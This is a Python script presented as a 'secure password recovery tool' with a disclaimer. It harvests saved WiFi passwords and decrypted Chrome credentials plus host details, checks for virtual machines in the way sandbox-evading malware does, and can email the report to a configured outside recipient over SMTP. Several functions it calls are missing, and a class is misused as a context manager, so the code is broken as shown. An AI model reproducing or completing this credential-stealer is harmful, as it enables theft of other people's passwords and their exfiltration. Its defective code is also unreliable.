#!/usr/bin/env python3
"""
SECURE PASSWORD RECOVERY TOOL
Author: Your Name
License: GPL-3.0 (Ethical Use Only)
"""

import platform
import socket
import psutil
import smtplib
import os
import sqlite3
import subprocess
import re
import json
import keyring
import getpass
from email.mime.text import MIMEText
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import base64
from cryptography.fernet import Fernet
import ssl
import hashlib

try:
    import win32crypt
except ImportError:
    pass

# Configuration - Use environment variables or keyring
class SecureConfig:
    @staticmethod
    def get_credentials():
        """Securely retrieve credentials from keyring or env vars"""
        return {
            'server': os.getenv("SMTP_SERVER", "smtp.gmail.com"),
            'port': int(os.getenv("SMTP_PORT", "465")),
            'email': os.getenv("SENDER_EMAIL") or keyring.get_password("flash2msg", "email"),
            'password': os.getenv("SENDER_PASSWORD") or keyring.get_password("flash2msg", "password"),
            'recipient': os.getenv("RECIPIENT") or keyring.get_password("flash2msg", "recipient")
        }

class SecureString:
    """Securely handle sensitive strings in memory"""
    def __init__(self, data):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted = self.cipher.encrypt(data.encode())
        
    def get(self):
        return self.cipher.decrypt(self.encrypted).decode()
        
    def clear(self):
        self.encrypted = b''
        self.key = b''
        del self.cipher

def show_disclaimer():
    """Display legal disclaimer and get consent"""
    print("""
    ⚠️ LEGAL DISCLAIMER ⚠️
    This tool is for RECOVERY PURPOSES ONLY on devices YOU OWN.
    Unauthorized use violates computer crime laws in many jurisdictions.
    
    By proceeding, you confirm:
    1. You own this device or have explicit owner permission
    2. You understand this tool extracts sensitive credentials
    3. You accept all legal responsibility for proper use
    """)
    return input("Type 'I AGREE' to continue: ").strip() == "I AGREE"

def get_system_info():
    """Get basic system information without sensitive details"""
    with SecureString(getpass.getuser()) as secure_user:
        info = {
            "Hostname": socket.gethostname(),
            "OS": platform.system() + " " + platform.release(),
            "CPU": platform.processor(),
            "Memory": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            "User": secure_user.get(),
            "Run Timestamp": datetime.now().isoformat()
        }
        secure_user.clear()
    return "\n".join([f"{k}: {v}" for k, v in info.items()])

def validate_environment():
    """Check for signs of sandbox or virtual machine"""
    vm_indicators = [
        "vbox" in platform.system().lower(),
        "vmware" in platform.system().lower(),
        psutil.cpu_percent() < 1  # Unusually low CPU usage
    ]
    if any(vm_indicators):
        print("⚠️ Warning: Virtual environment detected")
        if not input("Continue anyway? (y/n): ").lower() == 'y':
            exit(1)

def _get_wifi_windows():
    """Windows WiFi password extraction with secure handling"""
    try:
        profiles = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], 
            stderr=subprocess.DEVNULL,
            text=True
        )
        profile_names = re.findall(r': (.*)', profiles)
        results = ""
        
        for name in profile_names:
            try:
                profile_info = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                    stderr=subprocess.DEVNULL,
                    text=True
                )
                if password_match := re.search(r'Key Content\s*: (.*)', profile_info):
                    secure_pw = SecureString(password_match.group(1))
                    results += f"WiFi: {name:<30}| Password: {secure_pw.get()}\n"
                    secure_pw.clear()
            except subprocess.CalledProcessError:
                continue
        return results
    except Exception as e:
        return f"WiFi Error: {str(e)}"

def decrypt_chrome_password(encrypted_password, key=None):
    """Securely decrypt Chrome passwords"""
    try:
        if platform.system() == 'Windows':
            decrypted = win32crypt.CryptUnprotectData(
                encrypted_password, 
                None, 
                None, 
                None, 
                0
            )[1]
            return SecureString(decrypted.decode()).get()
        elif key:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return SecureString(cipher.decrypt(payload)[:-16].decode()).get()
    except Exception:
        return "DECRYPTION_FAILED"
    return "UNSUPPORTED_PLATFORM"

def send_report_secure(full_data):
    """Send report with TLS and credential validation"""
    config = SecureConfig.get_credentials()
    
    if not all(config.values()):
        print("❌ Missing email configuration")
        return False

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(config['server'], config['port'], context=context) as server:
            secure_pw = SecureString(config['password'])
            server.login(config['email'], secure_pw.get())
            secure_pw.clear()
            
            msg = MIMEText(full_data)
            msg["From"] = config['email']
            msg["To"] = config['recipient']
            msg["Subject"] = "Secure System Report"
            msg.add_header('X-Content-Type-Options', 'nosniff')
            
            server.sendmail(config['email'], config['recipient'], msg.as_string())
        return True
    except Exception as e:
        print(f"⚠️ Email failed: {str(e)}")
        return False

def main():
    """Main execution with security checks"""
    if not show_disclaimer():
        return
    
    validate_environment()
    
    print("\n🔍 Collecting system information...")
    system_info = get_system_info()
    
    if not confirm_sensitive_action("extract WiFi and Chrome passwords"):
        return
    
    print("\n🔒 Retrieving passwords (this may take a moment)...")
    password_data = "\n[PASSWORD REPORT]\n"
    password_data += "\n[WIFI PASSWORDS]\n" + get_wifi_passwords()
    password_data += "\n[CHROME PASSWORDS]\n" + get_chrome_passwords()
    
    full_report = system_info + password_data
    
    # Save with restricted permissions
    with open("system_report.txt", "w") as f:
        os.chmod("system_report.txt", 0o600)  # Owner read/write only
        f.write(full_report)
    
    print("\n✅ Report saved to system_report.txt")
    
    if input("\nSend encrypted email report? (y/n): ").lower() == 'y':
        if send_report_secure(full_report):
            print("📨 Report sent securely")
        else:
            print("❌ Failed to send report")

if __name__ == "__main__":
    main()